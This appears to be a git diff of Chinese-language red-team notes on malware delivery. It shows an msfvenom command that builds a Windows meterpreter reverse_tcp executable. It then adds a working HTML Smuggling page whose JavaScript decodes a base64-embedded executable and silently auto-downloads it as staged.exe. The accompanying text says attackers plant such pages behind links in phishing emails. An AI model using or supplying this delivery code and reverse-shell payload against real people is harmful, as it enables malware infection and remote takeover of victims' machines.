@@ -19,7 +19,19 @@ Ex: windows/meterpreter/reverse_tcp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f exe -o staged.exe
 ```
 ## HTML Smuggling 
-想要在受害端機器上下載並執行相關的惡意程式，攻擊者會經常使用更謹慎的投放的方式。攻擊者可能將鏈接嵌入到電子郵件，當受害者閱讀電子郵件並存取網頁時，網頁自動下載惡意程式，
-### *稱為 HTML Smuggling*
-
+想要在受害端機器上下載並執行相關的惡意程式，攻擊者會經常使用更謹慎的投放的方式。攻擊者可能將鏈接嵌入到電子郵件，當受害者閱讀電子郵件並存取網頁時，網頁自動下載惡意程式，為HTML Smuggling
+### Example
+```
+<html><body><script>	
+function base64ToArrayBuffer(base64) { var binary_string = window.atob(base64); var len = binary_string.length; var bytes = new Uint8Array( len ); for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); } return bytes.buffer;}
+var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAA... (產生的base64 )
+var data = base64ToArrayBuffer(file);
+var blob = new Blob([data], {type: 'octet/stream'});
+var fileName = 'staged.exe'; var a = document.createElement('a');
+document.body.appendChild(a); a.style = 'display: none';
+var url = window.URL.createObjectURL(blob);
+a.href = url; a.download = fileName; a.click();
+window.URL.revokeObjectURL(url);
+</script></body></html>
+```
 
